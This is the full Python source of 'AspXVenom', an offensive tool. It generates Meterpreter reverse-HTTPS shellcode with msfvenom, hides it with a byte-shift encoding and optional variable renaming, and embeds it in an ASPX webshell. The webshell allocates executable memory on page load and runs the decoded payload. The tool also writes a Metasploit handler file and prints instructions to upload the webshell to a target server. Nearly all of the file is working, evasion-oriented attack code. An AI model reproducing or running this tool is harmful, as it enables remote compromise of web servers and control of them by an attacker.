#!/usr/bin/env python3

BANNER = r"""
       █████╗ ███████╗██████╗ ██╗  ██╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
      ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
      ███████║███████╗██████╔╝ ╚███╔╝ ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
      ██╔══██║╚════██║██╔═══╝  ██╔██╗ ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
      ██║  ██║███████║██║     ██╔╝ ██╗ ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
      ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
      AspXVenom - Shellcode Generator | v2.0 | by Ivan Spiridonov (xbz0n) | https://xbz0n.sh
   """

import os
import sys
import subprocess
import re
import argparse
import random
import logging
import tempfile
from typing import Optional, Dict, Any

HELPER_CS_TEMPLATE = """using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace CaesarEncrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            !!!SHELLCODE!!!

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + !!!ENCRYPTION_KEY!!!) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2},", b);
            }

            File.WriteAllText("encoded_shellcode.txt", hex.ToString());

            string fileContent = File.ReadAllText("encoded_shellcode.txt");

            Console.WriteLine("The payload is: " + fileContent);
        }
    }
}
"""

WEBSHELL_TEMPLATE = """<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">

    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]  
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true,ExactSpelling = true)]   
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]  
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        
        if(mem == null)
        {
            return;
        }

        byte[] oe7hnH0 = new byte[] {!!!ENCRYPTEDSHELLCODE!!!};
        
        for(int i = 0; i < oe7hnH0.Length; i++)
        
        {
            oe7hnH0[i] = (byte)(((uint)oe7hnH0[i] - !!!ENCRYPTION_KEY!!!) & 0xFF);
        }
        
        IntPtr uKVv = VirtualAlloc(IntPtr.Zero,(UIntPtr)oe7hnH0.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
        System.Runtime.InteropServices.Marshal.Copy(oe7hnH0,0,uKVv,oe7hnH0.Length);
        
        IntPtr xE34tIARlB = IntPtr.Zero;
        
        IntPtr iwuox = CreateThread(IntPtr.Zero,UIntPtr.Zero,uKVv,IntPtr.Zero,0,ref xE34tIARlB);
    }

</script>
"""

class ShellcodeGenerator:
    def __init__(self, lhost: str, lport: str, output_dir: str = "output", 
                 payload: str = "windows/x64/meterpreter/reverse_https",
                 encryption_key: Optional[int] = None, verbose: bool = False,
                 variable_obfuscation: bool = False):
        self.lhost = lhost
        self.lport = lport
        self.output_dir = output_dir
        self.payload = payload
        self.encryption_key = encryption_key if encryption_key is not None else random.randint(1, 255)
        self.variable_obfuscation = variable_obfuscation
        
        self.temp_dir = tempfile.mkdtemp()
        
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=log_level)
        self.logger = logging.getLogger(__name__)
        
        self._validate_inputs()
        
        self._setup_output_dir()
        
        self.paths = {
            'shellcode': os.path.join(self.temp_dir, "charp.txt"),
            'helper_cs': os.path.join(self.temp_dir, "ASPX-Helper.cs"),
            'helper_exe': os.path.join(self.temp_dir, "ASPX-Helper.exe"),
            'encoded_shellcode': os.path.join(self.temp_dir, "encoded_shellcode.txt"),
            'webshell_final': os.path.join(self.output_dir, "WebShellFinal.aspx"),
            'metasploit_rc': os.path.join(self.output_dir, "met64.rc")
        }

    def _validate_inputs(self) -> None:
        if not self.lhost:
            raise ValueError("LHOST cannot be empty")
        
        try:
            port_num = int(self.lport)
            if port_num < 1 or port_num > 65535:
                raise ValueError("LPORT must be between 1 and 65535")
        except ValueError:
            raise ValueError(f"LPORT must be a valid port number, got: {self.lport}")
            
        if self.encryption_key < 1 or self.encryption_key > 255:
            raise ValueError("Encryption key must be between 1 and 255")

    def _setup_output_dir(self) -> None:
        try:
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)
                self.logger.info(f"Created output directory: {self.output_dir}")
        except Exception as e:
            self.logger.error(f"Failed to create output directory: {str(e)}")
            raise

    def _cleanup(self) -> None:
        try:
            import shutil
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                self.logger.debug(f"Cleaned up temporary directory: {self.temp_dir}")
        except Exception as e:
            self.logger.warning(f"Failed to clean up temporary files: {str(e)}")

    def run(self) -> bool:
        try:
            self._generate_shellcode()
            self._create_helper_file()
            self._compile_helper()
            self._run_helper()
            self._create_final_webshell()
            self._create_metasploit_rc()
            
            self.logger.info(f"Process completed successfully. Files saved to {self.output_dir}")
            self.logger.info(f"Encryption key used: {self.encryption_key}")
            self._print_summary()
            return True
            
        except Exception as e:
            self.logger.error(f"Process failed: {str(e)}")
            return False
        finally:
            self._cleanup()

    def _generate_shellcode(self) -> None:
        self.logger.info("Generating shellcode with msfvenom...")
        
        try:
            msfvenom_command = (
                f"msfvenom -p {self.payload} LHOST={self.lhost} LPORT={self.lport} "
                f"EXITFUNC=thread -f csharp -o {self.paths['shellcode']}"
            )
            
            process = subprocess.run(
                msfvenom_command, 
                shell=True, 
                check=True,
                text=True,
                capture_output=True
            )
            
            self.logger.debug(process.stdout)
            self.logger.info(f"Shellcode generated and saved to {self.paths['shellcode']}")
            
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error executing msfvenom: {e.stderr}")
            raise RuntimeError(f"Failed to generate shellcode: {e.stderr}")
        except Exception as e:
            self.logger.error(f"Unexpected error in shellcode generation: {str(e)}")
            raise

    def _create_helper_file(self) -> None:
        self.logger.info("Creating helper C# file...")
        
        try:
            with open(self.paths['shellcode'], "r") as f:
                shellcode = f.read()
            
            helper_content = HELPER_CS_TEMPLATE
            
            helper_content = helper_content.replace("!!!SHELLCODE!!!", shellcode)
            helper_content = helper_content.replace("!!!ENCRYPTION_KEY!!!", str(self.encryption_key))
            
            with open(self.paths['helper_cs'], "w") as f:
                f.write(helper_content)
                
            self.logger.info(f"Helper file created at {self.paths['helper_cs']}")
            
        except Exception as e:
            self.logger.error(f"Error creating helper file: {str(e)}")
            raise

    def _compile_helper(self) -> None:
        self.logger.info("Compiling helper C# file...")
        
        try:
            compile_command = (
                f"mcs -platform:x64 -unsafe {self.paths['helper_cs']} "
                f"-out:{self.paths['helper_exe']}"
            )
            
            process = subprocess.run(
                compile_command, 
                shell=True, 
                check=True,
                text=True,
                capture_output=True
            )
            
            self.logger.debug(process.stdout)
            self.logger.info(f"Helper compiled successfully to {self.paths['helper_exe']}")
            
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Compilation error: {e.stderr}")
            raise RuntimeError(f"Failed to compile helper: {e.stderr}")
        except Exception as e:
            self.logger.error(f"Unexpected error in compilation: {str(e)}")
            raise

    def _run_helper(self) -> None:
        self.logger.info("Running helper to generate encoded shellcode...")
        
        current_dir = os.getcwd()
        try:
            os.chdir(self.temp_dir)
            
            run_command = "mono ASPX-Helper.exe"
            process = subprocess.run(
                run_command,
                shell=True,
                check=True,
                text=True,
                capture_output=True
            )
            
            self.logger.debug(process.stdout)
            self.logger.info("Encoded shellcode generated successfully")
            
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error running helper: {e.stderr}")
            raise RuntimeError(f"Failed to run helper: {e.stderr}")
        except Exception as e:
            self.logger.error(f"Unexpected error running helper: {str(e)}")
            raise
        finally:
            os.chdir(current_dir)

    def _generate_random_variable_name(self, length: int = 8) -> str:
        import string
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for _ in range(length))

    def _create_final_webshell(self) -> None:
        self.logger.info("Creating final webshell...")
        
        try:
            with open(self.paths['encoded_shellcode'], "r") as f:
                encoded_shellcode = f.read()
            
            webshell_content = WEBSHELL_TEMPLATE
            
            webshell_content = webshell_content.replace("!!!ENCRYPTEDSHELLCODE!!!", encoded_shellcode)
            webshell_content = webshell_content.replace("!!!ENCRYPTION_KEY!!!", str(self.encryption_key))
            
            if self.variable_obfuscation:
                self.logger.info("Obfuscating variable names...")
                variable_names = ["oe7hnH0", "uKVv", "xE34tIARlB", "iwuox"]
                for var_name in variable_names:
                    random_name = self._generate_random_variable_name()
                    webshell_content = re.sub(r'\b' + var_name + r'\b', random_name, webshell_content)
            
            with open(self.paths['webshell_final'], "w") as f:
                f.write(webshell_content)
                
            self.logger.info(f"Final webshell created at {self.paths['webshell_final']}")
            
        except Exception as e:
            self.logger.error(f"Error creating final webshell: {str(e)}")
            raise

    def _create_metasploit_rc(self) -> None:
        self.logger.info("Creating Metasploit resource file...")
        
        try:
            with open(self.paths['metasploit_rc'], "w") as f:
                f.write(f"use exploit/multi/handler\n")
                f.write(f"set payload {self.payload}\n")
                f.write(f"set LHOST {self.lhost}\n")
                f.write(f"set LPORT {self.lport}\n")
                f.write(f"set exitfunc thread\n")
                f.write(f"run -j\n")
                
            self.logger.info(f"Metasploit resource file created at {self.paths['metasploit_rc']}")
            
        except Exception as e:
            self.logger.error(f"Error creating Metasploit resource file: {str(e)}")
            raise

    def _print_summary(self) -> None:
        print("\n" + "="*60)
        print(" AspXVenom - Shellcode Generator Summary ")
        print("="*60)
        print(f"LHOST: {self.lhost}")
        print(f"LPORT: {self.lport}")
        print(f"Payload: {self.payload}")
        print(f"Encryption Key: {self.encryption_key}")
        print(f"Variable Obfuscation: {'Enabled' if self.variable_obfuscation else 'Disabled'}")
        print("\nGenerated Files:")
        print(f"- Webshell: {os.path.abspath(self.paths['webshell_final'])}")
        print(f"- Metasploit RC: {os.path.abspath(self.paths['metasploit_rc'])}")
        print("\nUsage:")
        print(f"1. Upload {os.path.basename(self.paths['webshell_final'])} to the target server")
        print(f"2. Start Metasploit handler: msfconsole -r {os.path.basename(self.paths['metasploit_rc'])}")
        print("="*60 + "\n")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='AspXVenom - Advanced ASPX Shellcode Generator with Encryption and Obfuscation',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument('--LHOST', required=True, help='LHOST value (IP address to receive the connection)')
    parser.add_argument('--LPORT', required=True, help='LPORT value (Port to receive the connection)')
    
    parser.add_argument('--output-dir', default="output", help='Directory to save generated files')
    parser.add_argument('--payload', default="windows/x64/meterpreter/reverse_https", 
                       help='Metasploit payload to use')
    parser.add_argument('--key', type=int, help='Custom encryption key (1-255). Random if not specified')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    parser.add_argument('--obfuscate', '-o', action='store_true', help='Obfuscate variable names in the final webshell')
    
    args = parser.parse_args()
    
    try:
        generator = ShellcodeGenerator(
            lhost=args.LHOST,
            lport=args.LPORT,
            output_dir=args.output_dir,
            payload=args.payload,
            encryption_key=args.key,
            verbose=args.verbose,
            variable_obfuscation=args.obfuscate
        )
        
        success = generator.run()
        return 0 if success else 1
        
    except ValueError as e:
        print(f"Error in input parameters: {str(e)}")
        return 1
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return 1

if __name__ == "__main__":
    sys.exit(main()) 